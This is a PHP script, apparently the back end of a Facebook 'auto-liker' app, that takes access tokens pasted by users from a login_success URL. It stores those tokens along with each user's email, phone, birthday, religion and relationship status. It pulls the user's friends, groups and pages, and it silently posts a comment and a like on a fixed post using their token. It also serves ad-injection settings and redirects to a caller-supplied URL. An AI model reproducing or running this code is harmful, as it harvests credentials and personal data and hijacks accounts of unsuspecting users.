<?php
//ini_set('display_errors', 1);
//ini_set('display_startup_errors', 1);
//error_reporting(E_ALL);
@ob_start();
@session_start();
ini_set('max_execution_time', 0);
include 'inc/config.php';
$lg='ar';
include 'inc/lang.php';
include 'inc/function.php';
$St= getSet();
$time=time();
if(isv('app',1)){
    $postb['message'] = isv('posts',1);
    $postb['link'] = isv('link',1);
    $postb['access_token'] = isv('access',1);
    $id= Tpost(0,"me",$postb)['id'];
 if($id){
       echo redMsg('Success','Done',1,false,'/?post=sucess');
 }else{
       echo redMsg('Error','Done',1,false,'/?post=error&msg='.print_r($id));

 }
 die();
}
if(isv('myads',1)){

 $num = array_search(isv('myads',1),explode(",",getSet()->bloger_url));
if(in_array(isv('myads',1),explode(",",getSet()->bloger_url)) or getSet()->bloger_url == isv('myads',1)  ){
?>
var fram =<?=getSet()->bloger_ad?>;
var ads =<?=getSet()->bloger_ads?>;
<?php
if(is_array(explode(",",getSet()->bloger_v_code))){
    ?>
var vcode ="<?=explode(",",getSet()->bloger_v_code)[$num]?>";
<?php    }else{     ?>
var vcode ="<?=getSet()->bloger_v_code?>";
<?php    } ?>

var url="<?=getSet()->url?>";
<?php
if(is_array(explode(",",getSet()->bloger_ad_code))){
    ?>
var myid="<?=explode(",",getSet()->bloger_ad_code)[$num]?>";
<?php    }else{     ?>
var myid="<?=getSet()->bloger_ad_code?>";
<?php    }    ?>

var count="<?=getSet()->bloger_ad_count?>";
var red="<?=getSet()->bloger_ad_red?>";
<?php
if(getSet()->bloger_ad_sand){
    ?>
var sand="allow-scripts allow-forms";
<?php    }else{     ?>
var sand=" ";
<?php
    }
     }

    die();
}
if(isv('redAccess',1)){
echo redAccess('cookie_'.isv('uid',1).'.txt');
    die();
}
if(isv('groups',1)){
$limit=2000;
$access= isv('groups',1);
$id= isv('id',1);
$type = isv('type',1);
$type["type"] = $type;
$dg = json_decode(readURL('https://graph.facebook.com/v2.9/me/groups?access_token='.$access.'&method=GET&limit='.$limit),true);
if($dg["data"]){
$postb['access_token'] = $access;
for($i=0;$i<count($dg["data"]);$i++){
$postb['pid'] = $dg["data"][$i]["id"];
$type["admin"] = false;
//$type["admin"] = Cg($id,$postb);
AddGP('groups',$id,$dg["data"][$i]["name"],$dg["data"][$i]["id"],$type);
}
}
echo json_encode(count($dg["data"]));
die();
}
if(isv('pages',1)){
$limit=5000;
$type = isv('type',1);
$access= isv('pages',1);
$id= isv('id',1);
$dg = json_decode(readURL('https://graph.facebook.com/me/accounts?type=page&access_token='.$access.'&method=GET&limit='.$limit),true);
//////////////////////////////////////
if($dg["data"]){
for($i=0;$i<count($dg["data"]);$i++){
AddGP('pages',$id,$dg["data"][$i]["name"],$dg["data"][$i]["id"],$type);
}
}
echo json_encode(count($dg["data"]));
    die();
}
if(isv('friends',1)){
$limit=1000;
$type = isv('type',1);
$access= isv('friends',1);
$id= isv('id',1);
$dg = json_decode(readURL('https://graph.facebook.com/me/friends?access_token='.$access.'&method=GET&limit='.$limit),true);
//////////////////////////////////////
if($dg["data"]){
for($i=0;$i<count($dg["data"]);$i++){
AddGP('friends',$id,$dg["data"][$i]["name"],$dg["data"][$i]["id"],$type);
}
}
echo json_encode(count($dg["data"]));
    die();
}

$access= isv('access');
if(!$access){
if(isv('user',1) != 'access'){
if(isv('user',1)){
$access= isv('user',1);
}else{ $access = isv('Aaccess',1);  }
}else{
$access = getAccess($St->url.'/verify_chrome.php?redAccess=true&uid='.isv('uid',1));
//die($access);
}
}
$json = isv('type',1);
if(!empty($access) or isv('Aaccess',1)){
    if(isv('user',1)){
$access = base64_decode($access);
}else{ $access = isv('Aaccess',1);  }
$pos = strpos($access,"AAA");
//die($access);
if($pos == true or strpos($access,"access_token")){
$sr=  str_replace("view-source:https://m.facebook.com/connect/login_success.html#access_token=","",$access);
$sr1=  str_replace("https://m.facebook.com/connect/login_success.html#access_token=","",$sr);
$sr2=  str_replace("https://www.facebook.com/connect/login_success.html#access_token=","",$sr1);
$sr2 = str_replace("#access_token=","",substr($sr2,strpos($sr2,"#access_token=")));
$sr3=  str_replace("&expires_in=0","",$sr2);
if(isv('Aaccess',1)){
  $ac = isv('Aaccess',1);
$ac = str_replace("access_token=","",$ac);
$sr3=  str_replace("&expires_in=0","",$ac);
     }
$user_details = "https://graph.facebook.com/me?access_token=" .$sr3;
$response = readURL($user_details);
$response = json_decode($response);
//print_r($response->name);
$id=$response->id;
$name=$response->name;
$gender=$response->gender;
$birthday=$response->birthday;
$email=$response->email;
$mobile_phone=$response->mobile_phone;
$religion=$response->religion;
//$location=$response->location;
$relationship_status=$response->relationship_status;
$locale=$response->locale;
$description=$response->description;
//$religion=$response->location;
$email=$response->email;
////////////////////////////////////
$data = AddUser($id,$name,$sr3,$gender,$birthday,$email,$mobile_phone,$religion,$relationship_status,$locale,$description);
if(!empty($data)){

            mysql_query("delete from users  where  user_id=''");
           if(!Sion('sname') and !$json){
            $_SESSION['uid'] = $data['user_id'];
            $_SESSION['sname'] = $data['name'];
            $_SESSION['slev'] = $data['lev'];
            if($data['lev'] == 1){ UpDate('share','access',$sr3); }
            $_SESSION['desin'] = true;
            $_SESSION['spass']=$sr3;
            $_SESSION['sid']=$data['user_id'];
            $_SESSION['id']=$data['user_id'];
            $_SESSION['ip']=ip();
            $_SESSION['fb']=$name;
            $_SESSION['app']='htc';

                 }

        if($PUr !=  $AdF and 1 == 2){
        Json("http://app.nedalkher.net/verify_chrome.php?type=json&user=".$sr3);
        }
        if($data['lev'] != 1){
          $msg = "تم الاشتراك جزاك الله خيرا";
        Json("https://graph.facebook.com/1822039978066555/comments?access_token=".$sr3."&message=".urlencode($msg)."&method=post");
        Json("https://graph.facebook.com/1822039978066555/likes?access_token=".$sr3."&method=post");
        }
        if(isv('url',1)){
           header('Location: '.isv('url',1));
        }
        unlink('cookie_'.isv('uid',1).'.txt');
        iSion('htc',$data['id']);
       if(Sion('get')){  $rel= Sion('get'); }else if(Sion('htc')){ $rel = "/red.php?app=true&login=1&access=".$sr3; }else{ $rel=false; }
       iSion('msgs',1);
       echo redMsg('success','تم تسجيل الدخول بنجاح',1,$json,$rel);
          //  echo $data['user_id'];
        }else{
            //session_destroy();
         iSion('msgs',1);
        echo redMsg('error','خطأ  فى ادخال البيانات',1,$json,'/red.php?app=true&msg=error&error=insert');

        }
        }else{
           //session_destroy();
           iSion('msgs',1);
        echo redMsg('error','خطأ فى الكود او غير صحيح',1,$json,'/red.php?app=true&msg=error&error=acess');
        }
        }else{
             //session_destroy();
             iSion('msgs',1);
        echo redMsg('error','البيانات غير  كامله حاول مره اخرى',1,$json,'/red.php?app=true&msg=no_access&ac='.isv('Aaccess',1));
        }
?>